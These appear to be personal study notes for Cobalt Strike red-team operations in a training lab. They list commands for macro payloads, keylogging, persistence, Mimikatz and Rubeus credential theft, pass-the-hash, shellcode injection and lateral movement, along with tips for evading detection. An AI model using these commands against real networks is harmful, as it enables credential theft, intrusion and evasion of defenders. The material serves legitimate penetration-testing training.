
# Cobalt Strike
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf
## Getting Started
- Pre-requisites 
	- Oracle Java 1.8
	- Oracle Java 11
	- OpenJDK 11
- Start the Team Server
	- must run on a supportive Linux system
	- ./teamserver ip_address password malleableC2profile kill_date
	- sudo ./teamserver 192.168.174.133 password /root/Malleable-C2-Profiles/normal/webbug.profile
- Start the Client 
	- ./cobaltstrike-client.sh
	- cobaltstrike-client.cmd

## Listeners
- Types
	- Egress
		- General
			- allows Beacon to communicate outside of the target network to our team server
		- HTTP 
			- listeners allows Beacon to send and receive C2 messages over HTTP GET/POST requests
		- DNS 
			- send and receive C2 messages over several lookup/response types including A, AAAA and TXT
	- P2P or Peer-to-Peer
		- General
			- they don't communicate with the team server directly
			- child SMB/TCP beacon linked to an egress HTTP/DNS beacon
			- chain multiple Beacons into parent-child relationships
			- to reduce number of hosts talking to team server - better OPSEC
			- to run Beacons on machines that can't even talk out of the network (firewall, segregations) 
		- SMB
			- will start a new named pipe server and listen for incoming traffic 
			- OPSEC | emulate names known to be used by common applications, use ls \\.\pipe\ to list target names
		- raw TCP
			- will bind and listen on the specified port number
			- bind to only the localhost 127.0.0.1 or bind to all interfaces 0.0.0.0


## Payloads menu
- HTML Application
	- only for egress listeners
	- limited to x86
	- produces .hta file, uses embedded VBScript to run the payload
- MS Office Macro
	- only for egress listeners
	- compatible with x64 and x86 Office
	- produces VBA that can be dropped into macro-enabled MS-Word or Excel
- Stager Payload Generator
	- only for egress listeners
	- compatible with x64 and x86
	- produces a payload in C, C#, PowerShell, Python, VBA
- Stageless Payload Generator
	- generate stagess payload
	- no PowerShell, but you can specify exit function - process or thread
	- may generate payload for P2P listeners
- Windows Stager Payload
	- pre-compiled stager as an EXE, Service EXE or DLL
- Windows Stageless Payload
	- pre-compiled stageless payload for EXE, Service EXE, DLL, shellcode, Powershell
	- generating payloads for P2P listeners
- Windows Stageless Generate All Payloads
	- produces every stageless variant for every listener
	- x86 and x64 variants

## Pivot Listeners
- Can only be created on the existing Beacons
- work in the same way as TCP listener but in reverse
- to create right-click on a Beacon => Pivoting => Listener
- commands to start pivoting
	- spawn
	- elevate
	- jump


## VBA macros
- Word
	- Generating Payload
		- using MS Word: View => Macros => Create
		- generate paylod: Attacks => Scripted Web Delivery (S)
		- copy and paste paylod location into VBA and add extra "" 
	- Manually Hosting
		- Site Management => Host File
		- copy and paste paylod into VBA and add extra "" 
	- General
		- save as Word 97-2003 .doc for compability
		- OPSEC: File => Info => Inspect Document => Inspect Document click Inspect and then Remove All next to Personal Info
- Remote Template Injection
	- Open Word, create blank document and insert your macro
	- save as Word 97-2003 Template (.dot) file
	- host file
	- create a new document from the custum office template
	- add content, save as .docx
	- open document with 7-Zip => Open Archive => word => _rels
	- edit settings.xml.rels, locate Target =* enrty and insert paylod location there

## Host Reconnassance
- ps - list processes, also interesting processes
	- Sysmon64
	- MsMpEng
	- elastic-endpoint
	- elastic-agent
- execute-assembly
	- executing script that is located on the Team Server
- screenshots
	- printscreen - take a single shot via PrintScr method
	- screenshot - take a single screenshot
	- screenwatch - periodic screenshot of desktop
	- check captured screenshot: View => Screenshots
- keylogger
	- capture keystrokes
	- View => Keystrokes
	- jobs and jobkill # to kill keylogger
- clipboard
	- one-off command
	- dumps the content directly to the Beacon console
- user sessions
	- net logons

## Host Persistence
- General
	- encode your payload to base64 string
	- use SharPersist to create scheduled tasks
- Persistance Methods
	- HKCU / HKLM Registry Autoruns
	- Scheduled Tasks
	- Start on Boot with Startup Folder
	- COM Hijacks
- Useful tools
	- PowerLurk.ps1 - create backdoors
	- SharPersist.exe - create persistance mechanisms
	- procmon - search for processes on Windows

## Privilege Escalation
- Unquoted Service Paths
- Weak Service Permissions
- Weak Service Binary Permissions
- UAC Bypasses

## Credential Theft
- Beacon + Mimikatz
	- ! 
		- elevates Beacon to SYSTEM before running the given command
		- mimikatz !lsadump::sam
	- @ 
		- impersonates Beacon's thread token before running the given command
		- make_token NATURE/jraven Passoword1
		- mimikatz @lsadump::dcsync /user:NATURE\krbtgt
	- Logonpasswords
		- mimikatz !sekurlsa::logonpasswords
		- due to wdigest disabling by default it's rarely used
		- view at View => Credentials
		- OPSEC: open read handle to LSASS logged under event 4656
	- Kerberos Encryption Keys
		- mimikatz !sekurlsa::ekeys
		- mimikatz may incorrectly label all of the hashes as des_cbc_md4.
		- OPSEC: open read handle to LSASS 
	- SAM
		- mimikatz !lsadump::sam
		- NTLM hashes of local accounts only
		- OPSEC: suspicious SAM Hive Handle
	- Domain Cached Credentials
		- mimikatz !lsadump::cache
		- used for local authentication for domain credentials
		- can only be cracked, not PtH
		- OPPSEC: open handle to registry hive
- Extracting Kerberos Tickets with Rubeus
	- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
	- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
- DCSync
	- make_token DEV\nlamb F3rrari
	- dcsync dev.cyberbotic.io DEV\krbtgt
	- OPPSEC: can be detected if Directory Service Access auditing is On

## Domain Reconnaissance
- Scripts
	- PowerView
	- SharpView
	- ADSearch
- PowerView
	- powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
	- powershell Get-Domain
	- powershell Get-DomainController | select Forest, Name, OSVersion | fl
	- powershell Get-ForestDomain
	- powershell Get-DomainPolicyData | select -expand SystemAccess
	- powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
	- powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
	- powershell Get-DomainOU -Properties Name | sort -Property Name
	- powershell Get-DomainGroup | where Name -like "\*Admins\*" | select SamAccountName
	- powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
	- powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
	- powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
	- powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
	- powershell Get-DomainTrust

0x47024d

shell Rubeus.exe ptt /luid:0x47024d /ticket:doIFuj[...snip...]lDLklP
## User Impersonation
- General
	- rev2self to remove hash or token
	- kill PID to destroy logon session
- Pass-the-Hash
	- pth DEV\jking 59fc0f884922b4ce376051134c71e22c
	- rev2self
	- OPSEC: Two opportunities to detect PTH are the R/W handle to LSASS; and looking for the `echo foo > \\.\pipe\bar` pattern in command-line logs.
- Pass-the-Ticket
	- shell Rubeus.exe dump /luid:0x89703 /service:krbtgt /nowrap
	- shell Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
	- shell Rubeus.exe ptt /luid:0x47024d /ticket:doSNIP
	- steal_token 4748, which is the PID made with createnetonly 
	- OPSEC: Don't use randomly generated username, domain and password try to use existing username, random pass
- Overpass the Hash
	- allows to request Kerberos TGT for the user, using their NTLM or AES hash
	- shell Rubeus.exe asktgt /user:jking /ntlm:59fc0f884FSNIP /nowrap
	- shell Rubeus.exe asktgt /user:jking /aes256:4a8aad8SNIP /nowrap
	- this TGT can be used for Pass-the-Ticket attack
	- OPSEC: Instead of using legacy NTLM  that will generate RC4 (0x17) encrypted ticket use AES256 (0x12) instead
	- OPSEC: To blend in more by using NetBIOS name with /domain:DEV instead of not specifying domain and using FQDN
	- OPSEC: Also /opsec flag  results in the Ticket Options being 0x40810010.
	- OPSEC: Mimikatz writes to LSASS, Rubeus generate Kerberos traffic, so pick you poison
- Token Impersonation
	- steal_token can also be used to steal token without PtH
	- ps to find the process PID that other user is running and simply steal_token PID 
	- downside is if the user closes the process, our ability to abuse goes away
- Token Store
	- token-store steal 5536
	- token-store show
	- token-store use id
	- token-store remove id
	- token-store remove-all
- Make Token
	- impersonate user if you know their plaintext
	- make_token DEV\jking Qwerty123
	- remote-exec winrm web.dev.cyberbotic.io whoami
	- OPSEC: The events will show who the caller was, what user they impersonated, the calling process name, ID, and more
	- OPSEC: Detection downside is the runas /netonly behaves tha same way
- Process Injection
	- Non-elevate usually limit you to your own processes
	- Elevate, includes processes owned by other users
	- shinject
		- arbitrary shellcode from a binary file on your attacking machine
		- shinject 6752 x64 /path/to/shellcode.bin
	- inject
		- inject full beacon payload for the specified listener
		- inject 6752 x64 http

## Lateral Movement
- `Jump` Strategy
	- type jump to see all methods
	- > jump method target listener
	- methods
		- psexec
		- psexec64
		- psexec_psh
		- winrm
		- winrm64
	- this will spawn Beacon payload on the remote target, if P2P listener used - will connect automatically
- Built-in `remote-exec` Strategy
	- type remote-exec to see a list of methods
	- > remote-exec method target command
	- methods
		- psexec
		- winrm
		- wmi
	- more manual work to manage the payload, but offer more control
	- `connect` or `link`  commands to connect to P2P Beacons
- Using `other primitives` Strategy
	- `powershell`, `execute-assembly`, `shell`
	- implement something completely custom
	- custom methods can be integrated into the jump and remote-exec commands using Aggressor
- Combining
	- all are compatible with various techniques used for user impersonation
	- pth to impersonate user and then jump to move laterally





